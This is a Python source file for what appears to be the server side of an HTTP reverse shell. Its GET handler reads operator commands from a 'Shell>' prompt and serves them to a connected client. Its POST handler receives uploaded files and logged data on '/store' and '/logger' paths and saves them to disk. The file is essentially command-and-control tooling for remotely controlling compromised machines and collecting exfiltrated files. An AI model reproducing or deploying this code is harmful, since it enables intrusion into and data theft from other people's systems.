from http.server import BaseHTTPRequestHandler
import cgi
from config import App

class rs_handler(BaseHTTPRequestHandler):

    # Gets user input and send it to client with request headers
    def do_GET(user_input):
        command = input("Shell> ")
        user_input.send_response(200)
        user_input.send_header("Content-type", "text/html")
        user_input.end_headers()
        user_input.wfile.write(command.encode())

    # Gets data from the POST request & prints it out.    
    def do_POST(user_input):
        if user_input.path == '/store' or user_input.path == '/logger':
            try:
                # Get the content type headers & check if they're the right type.
                ctype, pdict = cgi.parse_header(user_input.headers.get_content_type())
                if ctype == 'multipart/form-data':
                    # Store request in FieldStorage object.
                    fs = cgi.FieldStorage(fp = user_input.rfile,
                    headers = user_input.headers,
                    environ = {'REQUEST_METHOD':'POST'})
                else:
                    print('[!] An unexpected error occurred.')
                file_item = fs['file']
                with open(App.config('OUTPUTFILEPATH'), 'wb') as o:
                    o.write(file_item.file.read())
                    user_input.send_response(200)
                    user_input.end_headers()

            except Exception as e:
                print(e)
        
        user_input.send_response(200)
        user_input.end_headers()
        request_length = int(user_input.headers['Content-Length'])
        request_data = user_input.rfile.read(request_length)
        print(request_data)



        
